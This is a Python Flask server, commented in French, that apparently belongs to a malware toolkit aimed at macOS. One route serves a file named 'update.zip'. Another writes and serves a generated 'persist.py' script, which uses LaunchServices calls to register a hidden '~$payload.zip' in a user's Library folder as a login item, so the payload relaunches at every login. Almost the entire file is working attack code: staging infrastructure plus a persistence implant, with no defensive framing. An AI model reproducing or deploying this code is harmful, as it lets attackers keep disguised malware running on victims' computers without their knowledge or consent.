from flask import Flask, send_file
from flask_restful import Resource, Api


# Retourne update.zip en cas de requête GET sur /update
class getUpdate(Resource):
    def get(self):
        return send_file('.\\Assets\\update.zip')


# Retourne le fichier de persitance python crafté avec les chemins absolus de fichier (PATH = "/Users/{path}/Library/~$payload.zip")
class getCraftedPayload(Resource):
    def get(self, path):
        with open('.\\Assets\\persist.py', 'w') as persist:
            persist.write(
                f"""from CoreFoundation import kCFURLPOSIXPathStyle\nfrom CoreFoundation import CFURLCreateWithFileSystemPath\nfrom CoreFoundation import kCFAllocatorDefault\nfrom Foundation import NSBundle\nfrom objc import loadBundleFunctions\nfrom objc import loadBundleFunctions\nfrom Foundation import NSBundle\nfrom LaunchServices import kLSSharedFileListSessionLoginItems\n\n# File or app to be added in the login items list\nPATH = "/Users/{path}/Library/~$payload.zip"\n\nshared_file_list = NSBundle.bundleWithIdentifier_(\n    'com.apple.coreservices.SharedFileList')\nf = [\n    ('LSSharedFileListCreate',\n     b'^{{OpaqueLSSharedFileListRef=}}^{{__CFAllocator=}}^{{__CFString=}}@'),\n    ('LSSharedFileListCopySnapshot',\n     b'^{{__CFArray=}}^{{OpaqueLSSharedFileListRef=}}o^I'),\n    ('LSSharedFileListInsertItemURL',\n     b'^{{OpaqueLSSharedFileListItemRef=}}^{{OpaqueLSSharedFileListRef=}}^{{OpaqueLSSharedFileListItemRef=}}^{{__CFString=}}^{{OpaqueIconRef=}}^{{__CFURL=}}^{{__CFDictionary=}}^{{__CFArray=}}'),\n    ('kLSSharedFileListItemBeforeFirst', b'^{{OpaqueLSSharedFileListItemRef=}}')\n]\nloadBundleFunctions(shared_file_list, globals(), f)\nappURL = CFURLCreateWithFileSystemPath(None, PATH, kCFURLPOSIXPathStyle, False)\nitems = LSSharedFileListCreate(kCFAllocatorDefault, kLSSharedFileListSessionLoginItems, None)\nLSSharedFileListInsertItemURL(items, kLSSharedFileListItemBeforeFirst, None, None, appURL, None, None)\n""")
        return send_file('.\\Assets\\persist.py')


# Mise en place du serveur Flask
app = Flask(__name__)
api = Api(app)

# Ajout des routes
api.add_resource(getUpdate, '/update')
api.add_resource(getCraftedPayload, '/<path>')


# Permet de démarrer le serveur depuis un autre script python et de paramétrer le port et l'hôte
def startHTTPServer(_host="0.0.0.0", _port="8080"):
    app.run(port=_port, host=_host)
